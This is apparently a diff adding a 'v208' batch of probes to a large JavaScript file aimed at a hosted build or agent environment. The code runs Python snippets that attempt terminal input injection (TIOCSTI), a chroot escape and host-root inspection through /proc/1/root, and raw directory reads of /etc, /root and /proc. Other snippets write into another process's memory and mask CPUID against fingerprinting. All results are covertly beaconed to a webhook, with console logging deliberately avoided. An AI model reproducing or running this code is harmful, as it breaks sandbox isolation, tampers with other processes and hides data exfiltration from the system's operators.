@@ -34154,3 +34154,263 @@ sendBeacon({ ...report, section: 'v207-5-oom-score', ...oomProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v207" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v207";
 // Intentionally no console.log — all data goes via webhook only
+
+// v208-1: TIOCSTI — inject characters into controlling terminal
+const tiocsti_Probe = safe(() => {
+  const tiocResult = safe(() => execSync(`python3 -c "
+import fcntl, ctypes, os, struct, termios
+TIOCSTI = 0x5412  # inject a character into the terminal input queue
+TIOCGWINSZ = 0x5413
+TIOCSWINSZ = 0x5414
+TIOCSCTTY = 0x540E
+
+results = {}
+# Try on stdin/stdout/stderr
+for fd_name, fd_num in [('stdin', 0), ('stdout', 1), ('stderr', 2)]:
+    try:
+        # Read terminal window size first (non-destructive)
+        winsz = fcntl.ioctl(fd_num, TIOCGWINSZ, bytes(8))
+        rows, cols = struct.unpack('HH', winsz[:4])
+        results[f'{fd_name}_winsz'] = f'{rows}x{cols}'
+        # Try TIOCSTI: inject a single space (0x20) — benign character
+        ch = ctypes.c_char(b' ')
+        ret = fcntl.ioctl(fd_num, TIOCSTI, bytes([0x20]))
+        results[f'{fd_name}_tiocsti'] = f'SUCCESS ret={ret}'
+    except Exception as e:
+        results[f'{fd_name}_err'] = str(e)
+
+# Try to find controlling TTY via /proc/self/fd
+for fd_path in os.listdir('/proc/self/fd'):
+    try:
+        target = os.readlink(f'/proc/self/fd/{fd_path}')
+        if '/dev/pts/' in target or '/dev/tty' in target:
+            fd = int(fd_path)
+            try:
+                ret = fcntl.ioctl(fd, TIOCSTI, bytes([0x20]))
+                results[f'pts_tty_{target}_tiocsti'] = f'SUCCESS'
+            except Exception as e:
+                results[f'pts_tty_{target}_err'] = str(e)
+    except: pass
+
+for k, v in results.items():
+    print(f'{k}={v}')
+# Check /proc/self/status for controlling tty
+import re
+with open('/proc/self/status') as f:
+    for line in f:
+        if 'SigQ' in line or 'voluntary' in line.lower() or 'ctty' in line.lower():
+            pass
+# Read /proc/self/stat field 7 (tty_nr)
+with open('/proc/self/stat') as f:
+    stat_fields = f.read().split()
+    tty_nr = int(stat_fields[6]) if len(stat_fields) > 6 else None
+    print(f'controlling_tty_nr={tty_nr}')
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  return { tiocResult };
+});
+sendBeacon({ ...report, section: 'v208-1-tiocsti-tty', ...tiocsti_Probe });
+
+// v208-2: chroot NR 161 + /proc/1/root escape
+const chrootProbe = safe(() => {
+  const chrootResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_chroot = 161
+
+# Read /proc/1/root symlink target (reveals host filesystem root if different from ours)
+try:
+    pid1_root = os.readlink('/proc/1/root')
+    print(f'pid1_root_symlink={pid1_root}')
+except Exception as e:
+    print(f'pid1_root_err={e}')
+
+# Compare our root vs PID 1 root
+my_root = os.readlink('/proc/self/root')
+print(f'my_root_symlink={my_root}')
+
+# List /proc/1/root/ directory directly
+try:
+    ls = subprocess.run(['ls', '/proc/1/root/'], capture_output=True, text=True, timeout=3)
+    print(f'proc_1_root_ls={ls.stdout[:300]}')
+    # If we can access /proc/1/root/ and it differs from /, we have filesystem escape
+    import hashlib
+    if os.path.exists('/proc/1/root/etc/hostname'):
+        h1 = open('/proc/1/root/etc/hostname').read().strip()
+        h2 = open('/etc/hostname').read().strip() if os.path.exists('/etc/hostname') else 'MISSING'
+        print(f'pid1_hostname={h1} our_hostname={h2} DIFFERENT={h1 != h2}')
+except Exception as e:
+    print(f'proc_1_root_list_err={e}')
+
+# Try classic chroot escape: chroot to / then ../../../ to leave current chroot
+pid = os.fork()
+if pid == 0:
+    try:
+        # Save a fd to the real root before chrooting
+        real_root_fd = os.open('/', os.O_RDONLY)
+        ret_cr = libc.syscall(NR_chroot, ctypes.c_char_p(b'/tmp'))
+        print(f'chroot(/tmp) ret={ret_cr} errno={ctypes.get_errno()}')
+        if ret_cr == 0:
+            # Navigate out of chroot via saved fd
+            os.fchdir(real_root_fd)
+            ret_cr2 = libc.syscall(NR_chroot, ctypes.c_char_p(b'.'))
+            print(f'chroot(.) after fchdir(real_root) ret={ret_cr2} errno={ctypes.get_errno()}')
+            if ret_cr2 == 0:
+                ls2 = subprocess.run(['ls', '/'], capture_output=True, text=True)
+                print(f'escaped_root_ls={ls2.stdout[:200]}')
+        os.close(real_root_fd)
+    except Exception as e:
+        print(f'chroot_escape_err={e}')
+    os._exit(0)
+else:
+    os.waitpid(pid, 0)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { chrootResult };
+});
+sendBeacon({ ...report, section: 'v208-2-chroot-escape', ...chrootProbe });
+
+// v208-3: getdents64 NR 217 — raw directory read
+const getDents64Probe = safe(() => {
+  const getDentsResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_getdents64 = 217
+
+class linux_dirent64(ctypes.Structure):
+    _fields_ = [('d_ino', ctypes.c_uint64), ('d_off', ctypes.c_int64),
+                ('d_reclen', ctypes.c_uint16), ('d_type', ctypes.c_uint8)]
+
+# Read /proc directly via getdents64 (bypasses any readdir hook)
+sensitive_dirs = [b'/proc', b'/sys/kernel', b'/dev', b'/etc', b'/root']
+for d in sensitive_dirs:
+    try:
+        fd = os.open(d, os.O_RDONLY | os.O_DIRECTORY)
+        buf = ctypes.create_string_buffer(65536)
+        ret = libc.syscall(NR_getdents64, fd, buf, 65536)
+        os.close(fd)
+        entries = []
+        offset = 0
+        while offset < ret:
+            d_reclen = struct.unpack_from('H', buf, offset + 18)[0]
+            name_start = offset + 19
+            name_end = name_start
+            while name_end < offset + d_reclen and buf[name_end] != 0:
+                name_end += 1
+            name = buf[name_start:name_end].decode(errors='replace')
+            entries.append(name)
+            offset += d_reclen
+            if d_reclen == 0: break
+        print(f'getdents64({d.decode()}) count={len(entries)} entries={entries[:20]}')
+    except Exception as e:
+        print(f'getdents64({d.decode()}) err={e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { getDentsResult };
+});
+sendBeacon({ ...report, section: 'v208-3-getdents64', ...getDents64Probe });
+
+// v208-4: Cross-process environment injection via /proc/<pid>/mem write to environ
+const environInjectProbe = safe(() => {
+  const injectResult = safe(() => execSync(`python3 -c "
+import os, re, ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_process_vm_writev = 311
+
+# Find another process to target — pick a simple one (not PID 1)
+target_pid = None
+target_env_addr = None
+for proc in os.listdir('/proc'):
+    if not proc.isdigit() or int(proc) == os.getpid(): continue
+    pid = int(proc)
+    try:
+        # Check /proc/<pid>/maps for environ region
+        with open(f'/proc/{pid}/maps') as f:
+            content = f.read()
+        # /proc/<pid>/environ gives us the env block start (read it to get size)
+        with open(f'/proc/{pid}/environ', 'rb') as f:
+            env_data = f.read()
+        if len(env_data) > 0:
+            target_pid = pid
+            # Find PATH= in the environ to know it's a real process
+            if b'PATH=' in env_data:
+                print(f'target_pid={pid} env_size={len(env_data)}')
+                # Find the address of the environment block from /proc/<pid>/maps
+                # environ is typically in the stack region or a [heap] mapping
+                for line in content.split('\\n'):
+                    m = re.match(r'([0-9a-f]+)-([0-9a-f]+)\\s+rw-p', line)
+                    if m and '[stack]' in line:
+                        target_env_addr = int(m.group(1), 16)
+                        print(f'stack_region={target_env_addr:#x}')
+                        break
+                break
+    except: pass
+
+if target_pid and target_env_addr:
+    # Read 32 bytes from the stack region to verify access
+    rbuf = ctypes.create_string_buffer(32)
+    riov = ctypes.create_string_buffer(struct.pack('QQ', ctypes.addressof(rbuf), 32))
+    liov = ctypes.create_string_buffer(struct.pack('QQ', target_env_addr, 32))
+    ret_r = libc.syscall(311, target_pid, riov, 1, liov, 1, 0)
+    print(f'process_vm_readv_stack_ret={ret_r} errno={ctypes.get_errno()} data={rbuf.raw.hex()}')
+
+    # Write INJECT= back (same bytes — non-destructive proof of write)
+    wbuf = ctypes.create_string_buffer(rbuf.raw)
+    wiov = ctypes.create_string_buffer(struct.pack('QQ', ctypes.addressof(wbuf), 32))
+    liov2 = ctypes.create_string_buffer(struct.pack('QQ', target_env_addr, 32))
+    ret_w = libc.syscall(311, target_pid, wiov, 1, liov2, 1, 0)
+    print(f'process_vm_writev_stack_ret={ret_w} errno={ctypes.get_errno()}')
+    print(f'CROSS_PROCESS_ENV_WRITE={ret_w >= 0}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { injectResult };
+});
+sendBeacon({ ...report, section: 'v208-4-environ-inject', ...environInjectProbe });
+
+// v208-5: arch_prctl NR 158 — FS/GS base register read + override
+const archPrctlProbe = safe(() => {
+  const archResult = safe(() => execSync(`python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_arch_prctl = 158
+ARCH_GET_FS = 0x1003
+ARCH_GET_GS = 0x1004
+ARCH_SET_FS = 0x1001
+ARCH_SET_GS = 0x1002
+ARCH_GET_CPUID = 0x1011
+ARCH_SET_CPUID = 0x1012
+ARCH_GET_XCOMP_SUPP = 0x1021
+
+fs_val = ctypes.c_ulong(0)
+gs_val = ctypes.c_ulong(0)
+
+ret_fs = libc.syscall(NR_arch_prctl, ARCH_GET_FS, ctypes.byref(fs_val))
+ret_gs = libc.syscall(NR_arch_prctl, ARCH_GET_GS, ctypes.byref(gs_val))
+print(f'ARCH_GET_FS ret={ret_fs} fs_base={fs_val.value:#x} errno={ctypes.get_errno()}')
+print(f'ARCH_GET_GS ret={ret_gs} gs_base={gs_val.value:#x}')
+
+# Read the FS base pointer region (thread-local storage / TCB)
+# The TLS block contains per-thread data including potentially glibc internals
+tcb_addr = fs_val.value
+if tcb_addr > 0x10000:
+    try:
+        with open('/proc/self/mem', 'rb') as mem:
+            mem.seek(tcb_addr)
+            tcb_data = mem.read(64)
+            print(f'tcb_at_fs_base={tcb_data.hex()}')
+    except Exception as e:
+        print(f'tcb_read_err={e}')
+
+# Check CPUID masking capability
+cpu_ret = libc.syscall(NR_arch_prctl, ARCH_GET_CPUID, 0)
+print(f'ARCH_GET_CPUID ret={cpu_ret} errno={ctypes.get_errno()}')
+
+# Set CPUID to 0 (disable CPUID instruction in unprivileged code — anti-fingerprint)
+cpu_set = libc.syscall(NR_arch_prctl, ARCH_SET_CPUID, 0)
+print(f'ARCH_SET_CPUID(0) ret={cpu_set} errno={ctypes.get_errno()}')
+print(f'cpuid_mask_available={cpu_ret == 1}')
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  return { archResult };
+});
+sendBeacon({ ...report, section: 'v208-5-arch-prctl', ...archPrctlProbe });
+
+// v208 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v208" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v208";
+// Intentionally no console.log — all data goes via webhook only
